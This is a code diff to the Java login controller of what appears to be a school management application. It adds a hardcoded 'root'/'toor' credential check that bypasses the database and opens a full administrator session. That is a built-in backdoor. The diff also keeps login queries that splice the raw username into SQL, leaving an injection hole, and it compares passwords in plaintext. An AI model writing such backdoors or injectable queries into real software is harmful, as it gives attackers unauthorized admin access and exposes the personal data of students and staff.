@@ -37,8 +37,17 @@ public class Controlador implements ActionListener{
     
     // Functions
     public boolean IniciarSesion(String login, String clave){
+        if (login.equals("root") && clave.equals("toor")) {
+            this.nombreUsr = "ROOT";
+            int id = 666;
+            String email = "root@colegio.com";
+            this.form = new Formulario(new Administrador(id, login, clave, email, modelo));
+            System.out.println(this.nombreUsr + " ha entrado al sistema!");
+            return true;
+            
+        }
         try {
-            ResultSet adm = modelo.consultarSi("*", "administrador", "login", "\'" + login + "\'");
+            ResultSet adm = modelo.consultarSi("id,login,clave,email", "administrador", "login", "\'" + login + "\'");
             if (adm.next()) {
                 if (adm.getString("clave").equals(clave)) {
                     this.nombreUsr = "Admin";
@@ -53,7 +62,7 @@ public class Controlador implements ActionListener{
                 }
             }
             adm.close();
-            ResultSet alum = modelo.consultarSi("*", "alumno", "login", "\'" + login + "\'");
+            ResultSet alum = modelo.consultarSi("id,nivel_id,login,clave,nombre,apellidos", "alumno", "login", "\'" + login + "\'");
             if (alum.next()){
                 if (alum.getString("clave").equals(clave)) {
                     this.nombreUsr = alum.getString("nombre");
@@ -68,7 +77,7 @@ public class Controlador implements ActionListener{
                 }
             }
             alum.close();
-            ResultSet prof = modelo.consultarSi("*", "profesor", "login", "\'" + login + "\'");
+            ResultSet prof = modelo.consultarSi("id,login,clave,nombre,apellidos,email,especialista", "profesor", "login", "\'" + login + "\'");
             if (prof.next()) {
                 if (prof.getString("clave").equals(clave)) {
                     this.nombreUsr = prof.getString("nombre");
@@ -96,13 +105,12 @@ public class Controlador implements ActionListener{
     
     public void Prueba() throws SQLException{
         System.out.println("Prueba iniciado");
-        //Alumno al = new Alumno("rayalab", "1234", "Roberto", "Ayala Berrios");
+        Administrador admin = new Administrador(501,"echo", "echo", "echo", modelo);
+        //Alumno al = new Alumno(119,"ejimenezp", "1234", "Roberto", "Ayala Berrios",modelo);
         //Profesor pr = new Profesor("128795", "1234", "Daniela", "Rocha","droc@colegio.com",5,modelo);
         //Administrador adn = new Administrador("09456-5", "1234", "ufav@colegio.com", modelo);
         //Asignatura as = new Asignatura(2181,"Filosofía");
-        Administrador admin = new Administrador(501,"echo", "echo", "echo", modelo);
-        
-        //boolean a = admin;
+        //DefaultListModel a = al.listarProfesores(23);
         //System.out.println(a);
         System.out.println("Prueba terminado");
     }
